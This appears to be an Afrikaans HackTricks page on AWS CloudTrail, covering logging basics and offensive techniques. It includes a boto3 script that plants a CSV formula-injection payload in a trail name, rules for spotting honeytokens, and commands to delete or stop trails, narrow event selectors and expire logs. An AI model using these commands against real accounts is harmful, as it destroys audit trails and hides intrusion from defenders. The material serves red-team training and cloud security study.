# AWS - CloudTrail Enum

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **registreer en monitor aktiwiteit binne jou AWS-omgewing**. Dit vang gedetailleerde **gebeurtenislogboeke** op, insluitend wie wat gedoen het, wanneer, en van waar, vir alle interaksies met AWS-hulpbronne. Dit verskaf 'n ouditspoor van veranderinge en aksies, wat help met sekuriteitsanalise, voldoeningsoudit en hulpbronveranderingopsporing. CloudTrail is noodsaaklik vir die verstaan van gebruiker- en hulpbron-gedrag, die verbetering van sekuriteitshoudings, en die verseker van regulatoriese voldoening.

Elke gelogde gebeurtenis bevat:

* Die naam van die opgeroepte API: `eventName`
* Die opgeroepte diens: `eventSource`
* Die tyd: `eventTime`
* Die IP-adres: `SourceIPAddress`
* Die agent metode: `userAgent`. Voorbeelde:
* Signing.amazonaws.com - Van AWS Management Console
* console.amazonaws.com - Root gebruiker van die rekening
* lambda.amazonaws.com - AWS Lambda
* Die versoekparameters: `requestParameters`
* Die respons elemente: `responseElements`

Gebeure word geskryf na 'n nuwe logl√™er **ongeveer elke 5 minute in 'n JSON-l√™er**, hulle word deur CloudTrail gehou en uiteindelik word logl√™ers **ongeveer 15 minute later aan S3 afgelewer**.\
CloudTrail-logboeke kan **oor rekeninge en streke heen saamgevoeg word.**\
CloudTrail laat toe om **logl√™erintegriteit te gebruik om te kan verifieer dat jou logl√™ers onveranderd gebly het** sedert CloudTrail dit aan jou afgelewer het. Dit skep 'n SHA-256 hash van die logboeke binne 'n verteer-l√™er. 'n SHA-256 hash van die nuwe logboeke word elke uur geskep.\
Wanneer 'n Trail geskep word, sal die gebeurtenis-selektore jou toelaat om aan te dui dat die Trail moet log: Bestuur, data of insigte gebeure.

Logboeke word gestoor in 'n S3-emmer. Standaard word Server Side Encryption gebruik (SSE-S3) sodat AWS die inhoud sal ontsleutel vir die mense wat toegang daartoe het, maar vir bykomende sekuriteit kan jy SSE met KMS en jou eie sleutels gebruik.

Die logboeke word gestoor in 'n **S3-emmer met hierdie naamformaat**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Die BucketName is: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Voorbeeld: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Binne elke vouer sal elke log 'n **naam h√™ wat hierdie formaat volg**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Logl√™er Naamkonvensie

![](<../../../../.gitbook/assets/image (122).png>)

Boonop sal **verteer-l√™ers (om l√™erintegriteit te kontroleer)** binne dieselfde emmer wees in:

![](<../../../../.gitbook/assets/image (195).png>)

### Saamgevoegde Logboeke van Meervoudige Rekeninge

* Skep 'n Trail in die AWS-rekening waar jy die logl√™ers wil laat aflewer
* Pas toestemmings toe op die bestemmings-S3-emmer wat kruis-rekening toegang vir CloudTrail toelaat en laat elke AWS-rekening wat toegang benodig toe
* Skep 'n nuwe Trail in die ander AWS-rekeninge en kies om die emmer wat in stap 1 geskep is te gebruik

Alhoewel jy al die logboeke in dieselfde S3-emmer kan stoor, kan jy nie CloudTrail-logboeke van meervoudige rekeninge saamvoeg in 'n CloudWatch Logs wat aan 'n enkele AWS-rekening behoort nie.

{% hint style="danger" %}
Onthou dat 'n rekening **verskillende Trails** van CloudTrail **geaktiveer** kan h√™ wat dieselfde (of verskillende) logboeke in verskillende emmers stoor.
{% endhint %}

### CloudTrail van alle org rekeninge in 1

Wanneer 'n CloudTrail geskep word, is dit moontlik om aan te dui om CloudTrail vir al die rekeninge in die org te aktiveer en die logboeke in net 1 emmer te kry:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Op hierdie manier kan jy maklik CloudTrail in al die streke van al die rekeninge konfigureer en die logboeke in 1 rekening sentraliseer (wat jy moet beskerm).

### Logl√™ers Kontroleer

Jy kan kontroleer dat die logboeke nie verander is nie deur te hardloop

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs na CloudWatch

**CloudTrail kan outomaties logs na CloudWatch stuur sodat jy waarskuwings kan stel wat jou waarsku wanneer verdagte aktiwiteite uitgevoer word.**\
Neem kennis dat om CloudTrail toe te laat om die logs na CloudWatch te stuur, 'n **rol** geskep moet word wat daardie aksie toelaat. Indien moontlik, word dit aanbeveel om AWS se standaardrol te gebruik om hierdie aksies uit te voer. Hierdie rol sal CloudTrail toelaat om:

* CreateLogStream: Dit laat toe om 'n CloudWatch Logs log stroom te skep
* PutLogEvents: Lewer CloudTrail logs aan CloudWatch Logs log stroom

### Gebeurtenis Geskiedenis

CloudTrail Gebeurtenis Geskiedenis laat jou toe om in 'n tabel die logs wat opgeneem is, te inspekteer:

![](<../../../../.gitbook/assets/image (89).png>)

### Insigte

**CloudTrail Insigte** analiseer outomaties **skryfbestuursgebeurtenisse** van CloudTrail roetes en **waarsku** jou oor **ongewone aktiwiteit**. Byvoorbeeld, as daar 'n toename is in `TerminateInstance` gebeurtenisse wat verskil van gevestigde baselines, sal jy dit as 'n Insig gebeurtenis sien. Hierdie gebeurtenisse maak **die vind en reaksie op ongewone API aktiwiteit makliker** as ooit tevore.

Die insigte word gestoor in dieselfde emmer as die CloudTrail logs in: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Sekuriteit

| CloudTrail Log L√™er Integriteit      | <ul><li>Valideer of logs gemanipuleer is (gewysig of verwyder)</li><li><p>Gebruik digest l√™ers (skep hash vir elke l√™er)</p><ul><li>SHA-256 hashing</li><li>SHA-256 met RSA vir digitale ondertekening</li><li>privaat sleutel besit deur Amazon</li></ul></li><li>Neem 1 uur om 'n digest l√™er te skep (gedoen op die uur elke uur)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop ongemagtigde toegang            | <ul><li><p>Gebruik IAM beleide en S3 emmer beleide</p><ul><li>sekuriteitspan ‚Äî> admin toegang</li><li>ouditeure ‚Äî> lees slegs toegang</li></ul></li><li>Gebruik SSE-S3/SSE-KMS om die logs te enkripteer</li></ul>                                                                                                                        |
| Voorkom dat log l√™ers verwyder word  | <ul><li>Beperk verwyder toegang met IAM en emmer beleide</li><li>Konfigureer S3 MFA verwydering</li><li>Valideer met Log L√™er Validering</li></ul>                                                                                                                                                                                            |

## Toegang Adviseur

AWS Toegang Adviseur maak staat op die laaste 400 dae AWS **CloudTrail logs om sy insigte te versamel**. CloudTrail neem 'n geskiedenis van AWS API oproepe en verwante gebeurtenisse wat in 'n AWS rekening gemaak is, op. Toegang Adviseur gebruik hierdie data om te **wys wanneer dienste laas gebruik is**. Deur CloudTrail logs te analiseer, kan Toegang Adviseur bepaal watter AWS dienste 'n IAM gebruiker of rol toegang tot gehad het en wanneer daardie toegang plaasgevind het. Dit help AWS administrateurs om ingeligte besluite te neem oor **verfyning van toestemmings**, aangesien hulle dienste kan identifiseer wat vir uitgebreide periodes nie gebruik is nie en potensieel te bre√´ toestemmings kan verminder gebaseer op werklike gebruikspatrone.

{% hint style="success" %}
Daarom, Toegang Adviseur lig in oor **die onnodige toestemmings wat aan gebruikers gegee word** sodat die admin dit kan verwyder
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Aksies

### Enumerasie
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

Dit is moontlik om 'n CVS-inspuiting binne CloudTrail uit te voer wat arbitr√™re kode sal uitvoer as die logs in CSV uitgevoer en met Excel oopgemaak word.\
Die volgende kode sal 'n loginskrywing genereer met 'n slegte Trail-naam wat die las bevat:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Vir meer inligting oor CSV Injections, kyk na die bladsy:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Vir meer inligting oor hierdie spesifieke tegniek, kyk [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Omseil Opsporing**

### HoneyTokens **omseil**

Honeyokens word geskep om **eksfiltrasie van sensitiewe inligting op te spoor**. In die geval van AWS, is hulle **AWS sleutels waarvan die gebruik gemonitor word**, as iets 'n aksie met daardie sleutel veroorsaak, dan moet iemand daardie sleutel gesteel het.

Maar, Honeytokens soos die wat deur [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) geskep word, gebruik √≥f herkenbare rekeningname √≥f dieselfde AWS rekening ID vir al hul kli√´nte. Daarom, as jy die rekeningnaam en/of rekening ID kan kry sonder om Cloudtrail enige log te laat skep, **kan jy weet of die sleutel 'n honeytoken is of nie**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) het 'n paar re√´ls om te bepaal of 'n sleutel aan [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)** behoort:**

* As **`canarytokens.org`** in die rolnaam verskyn of die rekening ID **`534261010715`** in die foutboodskap verskyn.
* Hulle gebruik tans die rekening **`717712589309`** en het steeds die **`canarytokens.com`** string in die naam.
* As **`SpaceCrab`** in die rolnaam in die foutboodskap verskyn.
* **SpaceSiren** gebruik **uuids** om gebruikersname te genereer: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* As die **naam lyk asof dit lukraak gegenereer is**, is daar 'n groot waarskynlikheid dat dit 'n HoneyToken is.

#### Kry die rekening ID van die Sleutel ID

Jy kan die **Rekening ID** kry van die **ge√´nkodeerde** binne die **toegangssleutel** soos [**hier verduidelik**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) en die rekening ID nagaan met jou lys van Honeytokens AWS rekeninge:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Kyk na meer inligting in die [**oorspronklike navorsing**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Moenie 'n log genereer nie

Die mees effektiewe tegniek hiervoor is eintlik 'n eenvoudige een. Gebruik net die sleutel wat jy pas gevind het om toegang te kry tot 'n diens binne jou eie aanvallersrekening. Dit sal **CloudTrail 'n log laat genereer binne JOU EIE AWS-rekening en nie binne die slagoffer s'n nie**.

Die ding is dat die uitset jou 'n fout sal wys wat die rekening-ID en die rekeningnaam aandui, so **jy sal kan sien of dit 'n Honeytoken is**.

#### AWS-dienste sonder logs

In die verlede was daar sommige **AWS-dienste wat nie logs na CloudTrail stuur nie** (vind 'n [lys hier](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Sommige van daardie dienste sal **reageer** met 'n **fout** wat die **ARN van die sleutelrol** bevat as iemand ongemagtig (die honeytoken sleutel) probeer om toegang daartoe te kry.

Op hierdie manier kan 'n **aanvaller die ARN van die sleutel verkry sonder om enige log te aktiveer**. In die ARN kan die aanvaller die **AWS-rekening-ID en die naam** sien, dit is maklik om die HoneyToken se maatskappye se rekening-ID's en name te ken, so op hierdie manier kan 'n aanvaller identifiseer of die token 'n HoneyToken is.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Let daarop dat alle publieke API's wat ontdek is om nie CloudTrail-logs te skep nie, nou reggestel is, so miskien moet jy jou eie vind...

Vir meer inligting, kyk na die [**oorspronklike navorsing**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Toegang tot Derde Infrastruktuur

Sekere AWS-dienste sal **sommige infrastruktuur skep** soos **Databasisse** of **Kubernetes** trosse (EKS). 'n Gebruiker wat **direk met daardie dienste praat** (soos die Kubernetes API) **sal nie die AWS API gebruik nie**, so CloudTrail sal nie hierdie kommunikasie kan sien nie.

Daarom kan 'n gebruiker met toegang tot EKS wat die URL van die EKS API ontdek het, 'n token plaaslik genereer en **direk met die API-diens praat sonder om deur CloudTrail opgespoor te word**.

Meer inligting in:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Verander CloudTrail Konfigurasie

#### Verwyder spore
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Stop trails

Om alle trails in 'n AWS-rekening te stop, kan die volgende opdrag gebruik word:

```bash
aws cloudtrail stop-logging --name <trail_name>
```

Hierdie opdrag stop die logging vir die gespesifiseerde trail.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Deaktiveer multi-streek logging

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### Deaktiveer Logging deur Gebeurtenis Selekteerders

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

In die eerste voorbeeld, word 'n enkele gebeurtenis selekteerder verskaf as 'n JSON-array met 'n enkele objek. Die `"ReadWriteType": "ReadOnly"` dui aan dat die **gebeurtenis selekteerder slegs lees-alleen gebeurtenisse moet vasvang** (so CloudTrail insigte **sal byvoorbeeld nie skryfgebeurtenisse nagaan nie).

Jy kan die gebeurtenis selekteerder aanpas gebaseer op jou spesifieke vereistes.

#### Logboek verwydering via S3 lewensiklusbeleid

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Verander Emmer Konfigurasie

* Vee die S3-emmer uit
* Verander emmerbeleid om enige skrywes van die CloudTrail-diens te weier
* Voeg lewensiklusbeleid by S3-emmer om voorwerpe te verwyder
* Deaktiveer die kms-sleutel wat gebruik word om die CloudTrail-logboeke te enkripteer

### Cloudtrail losprysware

#### S3 losprysware

Jy kan **'n asimmetriese sleutel genereer** en maak **CloudTrail die data enkripteer** met daardie sleutel en **verwyder die privaat sleutel** sodat die CloudTrail-inhoud nie herstel kan word nie.\
Dit is basies 'n **S3-KMS losprysware** soos verduidelik in:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS losprysware**

Dit is 'n makliker manier om die vorige aanval uit te voer met verskillende toestemmingsvereistes:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Verwysings**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-bewaarplekke.

</details>
{% endhint %}
